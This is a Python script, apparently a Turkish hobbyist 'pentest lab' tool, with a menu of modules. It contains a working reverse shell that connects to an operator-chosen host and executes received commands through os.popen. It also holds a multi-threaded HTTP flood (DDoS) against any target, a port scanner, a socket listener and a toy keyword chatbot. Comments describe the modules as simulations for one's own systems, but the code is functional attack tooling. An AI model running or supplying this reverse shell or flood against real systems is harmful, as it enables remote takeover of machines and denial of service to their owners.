#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proje Adı: RØCTKalinos_v8.0.py
# Sürüm: v8.0
# Açıklama: Pentest, Siber Savunma, Ağ Analizi ve Yapay Zeka Laboratuvarı

import os
import sys
import time
import socket
import threading
import json

# Terminal Renk Kodları
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

def ekran_temizle():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner_goster():
    print(f"{RED}{BOLD}")
    print(r"  _____   ____   _____ _______ _  __      _ _                      ")
    print(r" |  __ \ / __ \ / ____|__   __| |/ /     | (_)                     ")
    print(r" | |__) | |  | | |       | |  | ' /  __ _| |_ _ __   ___  ___      ")
    print(r" |  _  /| |  | | |       | |  |  <  / _` | | | '_ \ / _ \/ __|     ")
    print(r" | | \ \| |__| | |____   | |  | . \| (_| | | | | | | (_) \__ \     ")
    print(r" |_|  \_\\____/ \_____|  |_|  |_|\_\\__,_|_|_|_| |_|\___/|___/     ")
    print(f"                                                          v8.0{RESET}")
    print(f"{CYAN}=================================================================={RESET}")
    print(f"{YELLOW}[+] Geliştirici: RØCTKalinos Geliştirici Ekibi{RESET}")
    print(f"{YELLOW}[+] Modüller: Soket, Reverse Shell, HTTP Flood, Scanner, AI Engine{RESET}")
    print(f"{CYAN}=================================================================={RESET}\n")

# --- MODÜL 3: YEREL SOKET ---
def soket_dinleyici(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', int(port)))
        server.listen(1)
        print(f"\n{GREEN}[+] {port} portu dinleniyor... Bağlantı bekleniyor...{RESET}")
        istemci, adres = server.accept()
        print(f"\n{GREEN}[+] {adres} bağlandı!{RESET}")
        while True:
            veri = istemci.recv(1024).decode('utf-8').strip()
            if not veri or veri.lower() == 'exit': break
            print(f"\n{BLUE}[Gelen]: {veri}{RESET}")
            cevap = input(f"{YELLOW}Cevap: {RESET}")
            istemci.send(cevap.encode('utf-8'))
        istemci.close()
    except Exception as e: print(f"{RED}Hata: {e}{RESET}")
    finally: server.close()
    input(f"\n{CYAN}Menüye dönmek için Enter...{RESET}")

# --- MODÜL 4: REVERSE SHELL (YASAL RAT/UZAKTAN YÖNETİM MANTIĞI) ---
def reverse_shell_baglan(ip, port):
    """Hedef test makinesinden ana makineye gerçek komut satırı bağlantısı kurar."""
    print(f"\n{YELLOW}[*] {ip}:{port} adresine tersine bağlantı (RAT altyapısı) kuruluyor...{RESET}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send(b"[+] R0CTKalinos Komut Satiri Aktif.\n")
        while True:
            s.send(b"\nR0CTKalinos_Shell> ")
            komut = s.recv(1024).decode('utf-8').strip()
            if komut.lower() == 'exit': break
            # Güvenli terminal komut çalıştırma altyapısı (Sadece kendi sistemlerinde çalıştır)
            cikti = os.popen(komut).read()
            if not cikti: cikti = "[+] Komut calistirildi fakat cikti uretilmedi."
            s.send(cikti.encode('utf-8'))
        s.close()
    except Exception as e: print(f"{RED}[X] Bağlantı koptu veya başarısız: {e}{RESET}")
    input(f"\n{CYAN}Menüye dönmek için Enter...{RESET}")

# --- MODÜL 5: GERÇEK MULTI-THREADED DDOS (HTTP FLOOD STRES TESTİ) ---
bitti = False
def ddos_vuruş(hedef, port):
    global bitti
    while not bitti:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((hedef, int(port)))
            # Gerçek bir HTTP Get istek paketi oluşturuluyor
            istek = f"GET / HTTP/1.1\r\nhost: {hedef}\r\nUser-Agent: R0CTKalinos_v8.0\r\n\r\n".encode('utf-8')
            s.sendall(istek)
            s.close()
        except socket.error:
            pass

def ddos_testi_baslat(hedef, port, thread_sayisi, sure):
    global bitti
    bitti = False
    print(f"\n{RED}[!] {hedef}:{port} üzerine {thread_sayisi} thread ile test başladı...{RESET}")
    threadler = []
    for i in range(thread_sayisi):
        t = threading.Thread(target=ddos_vuruş, args=(hedef, port))
        threadler.append(t)
        t.start()
    
    time.sleep(sure)
    bitti = True
    print(f"\n{GREEN}[+] {sure} saniyelik ağ dayanıklılık testi tamamlandı.{RESET}")
    input(f"\n{CYAN}Menüye dönmek için Enter...{RESET}")

# --- MODÜL 6: AĞ TRAFİĞİ VE PORT TARAMA (SCANNER) ---
def port_tarama(hedef_ip):
    print(f"\n{YELLOW}[*] {hedef_ip} adresi üzerinde popüler portlar taranıyor...{RESET}")
    populer_portlar = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 8080]
    for port in populer_portlar:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5) # Hızlı tarama için zaman aşımı düşük tutuluyor
        sonuc = s.connect_ex((hedef_ip, port))
        if sonuc == 0:
            print(f"{GREEN}[+] Port {port} AÇIK!{RESET}")
        s.close()
    print(f"{CYAN}[+] Tarama işlemi bitti.{RESET}")
    input(f"\n{CYAN}Menüye dönmek için Enter...{RESET}")

# --- MODÜL 7: MARKOS AI YAPAY ZEKA MOTORU ---
def markos_ai_motoru():
    hafıza_dosyası = "markos_memory.json"
    if os.path.exists(hafıza_dosyası):
        with open(hafıza_dosyası, "r", encoding="utf-8") as f: veri_tabani = json.load(f)
    else:
        veri_tabani = {"selam": "Merhaba siber güvenlik uzmanı, ben MarkosAI. Nasıl yardımcı olabilirim kanka?", 
                       "hack": "Siber dünyada etik kalmak önemlidir. Bilgi güçtür ama yetki şarttır kanka!",
                       "ddos": "DDoS testleri web sunucularının yük sınırını belirlemek için thread mantığıyla yapılır."}

    print(f"\n{MAGENTA if 'MAGENTA' in locals() else CYAN}[ MarkosAI Yapay Zeka Motoru Aktif ]{RESET}")
    print(f"{YELLOW}(Çıkış yapmak için 'exit' yazın){RESET}\n")
    while True:
        soru = input(f"{BOLD}{BLUE}Sen > {RESET}").lower().strip()
        if soru == 'exit': break
        
        # Kelime eşleştirme tabanlı yapay zeka mantığı (Niyet algılama)
        cevap_bulundu = False
        for anahtar in veri_tabani:
            if anahtar in soru:
                print(f"{GREEN}MarkosAI > {veri_tabani[anahtar]}{RESET}\n")
                cevap_bulundu = True
                break
        
        if not cevap_bulundu:
            print(f"{YELLOW}MarkosAI > Bunu henüz bilmiyorum. Bana cevabını öğretir misin?{RESET}")
            yeni_cevap = input(f"{CYAN}Bu soruya ne cevap vermeliyim? (Atlamak için Enter): {RESET}").strip()
            if yeni_cevap:
                veri_tabani[soru] = yeni_cevap
                with open(hafıza_dosyası, "w", encoding="utf-8") as f: json.dump(veri_tabani, f, ensure_ascii=False, indent=4)
                print(f"{GREEN}[+] Bilgi hafızaya kaydedildi, öğrendim!{RESET}\n")

# --- ANA MENÜ AKIŞI ---
def ana_menu():
    ekran_temizle()
    banner_goster()
    print(f"{GREEN}1.{RESET} Yerel Soket (LAN) Dinleyici (Server)")
    print(f"{GREEN}2.{RESET} API İstek ve Bot Otomasyonu Analizörü")
    print(f"{GREEN}3.{RESET} Yerel Ağ Soket Bağlantı Modülü")
    print(f"{GREEN}4.{RESET} Reverse Shell (RAT/Uzak Komut Satırı Simülasyonu)")
    print(f"{GREEN}5.{RESET} HTTP Flood (DDoS Stres Testi Simülatörü)")
    print(f"{GREEN}6.{RESET} Yerel Ağ Trafiği ve Port Tarayıcı (Scanner)")
    print(f"{GREEN}7.{RESET} MarkosAI Yapay Zeka Asistanını Çalıştır")
    print(f"{RED}0.{RESET} Çıkış\n")

def main():
    while True:
        ana_menu()
        secim = input(f"{BOLD}{CYAN}RØCTKalinos > {RESET}").strip()
        
        if secim == "1":
            port = input("Dinlenecek Port: ").strip()
            soket_dinleyici(port)
        elif secim == "2":
            print(f"\n{YELLOW}[*] API Modülü test aşamasındadır...{RESET}"); time.sleep(1.5)
        elif secim == "3":
            ip = input("IP: ").strip(); port = input("Port: ").strip()
            # Yerel soket istemci kodunu çağırabilirsin (Yukarıdaki fonksiyon gibi)
        elif secim == "4":
            print(f"\n{CYAN}--- REVERSE SHELL MODÜLÜ ---{RESET}")
            ip = input("Bağlanılacak Ana Makine IP (Örn: 127.0.0.1): ").strip()
            port = input("Bağlanılacak Port (Örn: 4444): ").strip()
            reverse_shell_baglan(ip, port)
        elif secim == "5":
            print(f"\n{CYAN}--- HTTP FLOOD DDOS SIMÜLATÖRÜ ---{RESET}")
            hedef = input("Hedef IP veya localhost: ").strip()
            port = input("Hedef Port (Genelde 80 veya 8080): ").strip()
            threads = int(input("Thread Sayısı (Hız - Örn: 100): ").strip())
            sure = int(input("Test Süresi (Saniye): ").strip())
            ddos_testi_baslat(hedef, port, threads, sure)
        elif secim == "6":
            print(f"\n{CYAN}--- PORT TARAYICI MODÜLÜ ---{RESET}")
            hedef_ip = input("Taranacak Hedef IP (Örn: 127.0.0.1): ").strip()
            port_tarama(hedef_ip)
        elif secim == "7":
            markos_ai_motoru()
        elif secim == "0":
            print(f"\n{RED}[!] Güvende kalın kanka!{RESET}"); break
        else:
            print(f"\n{RED}[X] Geçersiz seçim!{RESET}"); time.sleep(1)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(0)
